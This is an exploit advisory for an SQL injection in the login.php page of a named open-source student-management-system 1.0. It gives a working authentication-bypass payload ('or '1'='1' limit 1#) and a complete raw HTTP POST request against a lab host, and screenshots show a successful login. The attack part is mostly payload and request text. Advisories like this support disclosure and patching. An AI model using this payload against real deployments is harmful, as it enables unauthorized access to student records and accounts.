# student-management-system login.php user SQL inject

   
#### Exploit Title: student-management-system login.php user SQL inject
#### Exploit Author: webraybtl@webray.com.cn inc
#### Vendor Homepage: https://github.com/ningzichun/student-management-system
#### Software Link: https://github.com/ningzichun/student-management-system
#### Version: student-management-system 1.0
#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description
The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection student-management-system does not filter the content correctly at the "login.php" user module, resulting in the generation of SQL injection.

#### Payload used:
`user='or '1'='1' limit 1#&pass='or '1'='1' limit 1#&submit=%E6%8F%90%E4%BA%A4`

#### Proof of Concept


1. Open login.php source code.

![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/b1172a22-8865-4368-b436-9b369edee757)

2. POST SQL injection payload  (`user='or '1'='1' limit 1#&pass='or '1'='1' limit 1#&submit=%E6%8F%90%E4%BA%A4`) 

3. Html Request Code

![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/094278d5-3144-4cb2-bb34-dee6f934025e)
```
POST /student/login.php HTTP/1.1
Host: 172.24.6.107:8081
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: http://172.24.6.107:8081
Connection: close
Referer: http://172.24.6.107:8081/student/?retry=1
Cookie: PHPSESSID=44sif2lb4iq80ieksie1intac7
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

user='or '1'='1' limit 1#&pass='or '1'='1' limit 1#&submit=%E6%8F%90%E4%BA%A4
```

4. user login

![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/7b977528-8ee2-492e-850a-3f88b26917cf)
![image](https://github.com/Xor-Gerke/webray.com.cn/assets/60683449/72730c85-66cc-49a3-a963-6669a24eb9c8)

